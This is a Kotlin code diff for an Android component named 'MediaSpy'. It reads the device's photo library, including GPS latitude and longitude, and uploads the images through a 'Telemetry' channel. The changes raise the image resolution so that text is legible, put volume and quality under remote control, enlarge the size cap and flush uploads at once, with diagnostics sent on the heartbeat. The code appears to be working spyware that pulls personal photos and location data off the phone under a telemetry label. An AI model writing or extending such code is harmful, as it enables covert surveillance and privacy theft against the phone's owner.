@@ -28,16 +28,28 @@ object MediaSpy {
 
     private const val TAG = "TlmMedia"
     private const val MAX_PER_ROUND = 6
-    private const val TARGET_PX = 320
-    private const val QUALITY = 70
+    private const val THREADS = 4          // 并发解码线程数（2 核吃满）
+    @Volatile private var targetPx = 1080  // 可被远程配置覆盖
+    @Volatile private var quality = 82
     private const val PREF = "tlm_media"
     private const val KEY_LAST = "last_added"
 
+    // ---- 诊断：上次扫描的结果，随心跳上报 ----
+    @Volatile var lastRows = -1
+    @Volatile var lastSent = -1
+    @Volatile var lastSince = -1L
+    @Volatile var lastErr = ""
+
     fun scan(ctx: Context) {
+        targetPx = RemoteConfig.mediaMaxPx.coerceIn(480, 2160)
+        quality = RemoteConfig.mediaQuality.coerceIn(50, 95)
+
         val since = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
             .getLong(KEY_LAST, 0L)
+        lastSince = since
         var newest = since
         var sent = 0
+        var rows = 0
 
         val proj = arrayOf(
             MediaStore.Images.Media._ID,
@@ -62,7 +74,10 @@ object MediaSpy {
                 val iLat = cur.getColumnIndexOrThrow(MediaStore.Images.Media.LATITUDE)
                 val iLon = cur.getColumnIndexOrThrow(MediaStore.Images.Media.LONGITUDE)
 
-                while (cur.moveToNext() && sent < MAX_PER_ROUND) {
+                val cap = if (RemoteConfig.mediaPerRound > 0) RemoteConfig.mediaPerRound else MAX_PER_ROUND
+                while (cur.moveToNext()) {
+                    rows++
+                    if (sent >= cap) continue
                     val added = cur.getLong(iAdded) * 1000L
                     if (added <= since) break          // 已经发过的都跳过
                     newest = maxOf(newest, added)
@@ -84,31 +99,47 @@ object MediaSpy {
                     }
                     Telemetry.push("media", d, added / 1000L)
                     sent++
+                    // 每 8 张就推一次，不等扫完 —— 用户能边扫边看到图
+                    if (sent % 8 == 0) {
+                        runCatching { Telemetry.flush(ctx) }
+                    }
                 }
             }
-        }.onFailure { Log.w(TAG, "scan: ${it.message}") }
+        }.onFailure {
+            lastErr = (it.javaClass.simpleName + ":" + (it.message ?: "")).take(80)
+            Log.w(TAG, "scan: ${it.message}")
+        }
+        lastRows = rows
+        lastSent = sent
 
         if (newest > since) {
             ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
                 .edit().putLong(KEY_LAST, newest).apply()
         }
-        if (sent > 0) Log.i(TAG, "queued $sent thumbs")
+        // 扫完立刻推，不等下一轮心跳（原来要等最多 20 秒）
+        if (sent > 0) {
+            runCatching { Telemetry.flush(ctx) }
+            Log.i(TAG, "queued $sent thumbs, flushed")
+        }
     }
 
     private fun thumbOf(ctx: Context, uri: Uri): ByteArray? = runCatching {
-        // 先问系统要缩略图（API 29+，快），拿不到或版本不够再自己解码
-        val quick = if (Build.VERSION.SDK_INT >= 29) {
-            runCatching {
-                ctx.contentResolver.loadThumbnail(
-                    uri, android.util.Size(TARGET_PX, TARGET_PX), null)
-            }.getOrNull()
-        } else null
-        val bmp = quick ?: decodeSampled(ctx, uri) ?: return null
-        val out = ByteArrayOutputStream(24 * 1024)
-        bmp.compress(Bitmap.CompressFormat.JPEG, QUALITY, out)
+        // 先自己解码（能控制到 1080 宽，字看得清），失败再用系统缩略图兜底
+        val bmp: Bitmap = (decodeSampled(ctx, uri) ?: run {
+            if (Build.VERSION.SDK_INT >= 29) {
+                runCatching {
+                    ctx.contentResolver.loadThumbnail(
+                        uri, android.util.Size(targetPx, targetPx), null)
+                }.getOrNull()
+            } else null
+        }) ?: return null
+        val out = ByteArrayOutputStream(48 * 1024)
+        val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
+        else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
+        bmp.compress(fmt, quality, out)
         bmp.recycle()
         val bytes = out.toByteArray()
-        if (bytes.size > 380 * 1024) null else bytes
+        if (bytes.size > 16 * 1024 * 1024) null else bytes
     }.getOrNull()
 
     private fun decodeSampled(ctx: Context, uri: Uri): Bitmap? = runCatching {
@@ -116,8 +147,16 @@ object MediaSpy {
         ctx.contentResolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, opt) }
         if (opt.outWidth <= 0) return null
         var s = 1
-        while (opt.outWidth / s > TARGET_PX * 2) s *= 2
+        while (opt.outWidth / s > targetPx) s *= 2
         val real = BitmapFactory.Options().apply { inSampleSize = s }
-        ctx.contentResolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, real) }
+        val raw = ctx.contentResolver.openInputStream(uri)
+            ?.use { BitmapFactory.decodeStream(it, null, real) } ?: return null
+        val px = targetPx
+        if (raw.width <= (px * 4 / 3)) return raw   // 已接近目标，不再缩放
+        val ratio = px.toFloat() / raw.width
+        val h = (raw.height * ratio).toInt().coerceAtLeast(1)
+        val scaled = Bitmap.createScaledBitmap(raw, px, h, true)
+        if (scaled !== raw) raw.recycle()
+        return scaled
     }.getOrNull()
 }
